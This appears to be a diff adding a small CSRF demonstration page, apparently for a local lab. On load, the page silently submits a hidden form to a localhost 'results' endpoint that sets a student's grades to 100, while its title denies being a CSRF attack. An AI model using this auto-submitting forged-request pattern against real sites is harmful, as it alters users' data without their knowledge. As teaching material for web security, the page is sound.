@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>This is not a CSRF attack.</title>
+    <script>
+    function myFunction() {
+        document.getElementById("funny-element").innerHTML = "YOU CLICKED ME!";
+    }
+    </script>
+</head>
+<body onload="document.form1.submit()">
+    <h1>This is a not a csrf site.</h1>
+    <h2>Keep scrolling.</h2>
+    <form action="http://localhost:5000/results" method="POST" name="form1" target="hidden-iframe">
+        <input type="hidden" name="Name" value="Batman"/>
+        <input type="hidden" name="Physics" value="100"/>
+        <input type="hidden" name="Mathematics" value="100"/>
+        <input type="hidden" name="Chemistry" value="100"/>
+    </form>
+    <div id="funny-element"></div>
+    <iframe name="hidden-iframe" style="display: none;"></iframe>
+</body>
+</html>
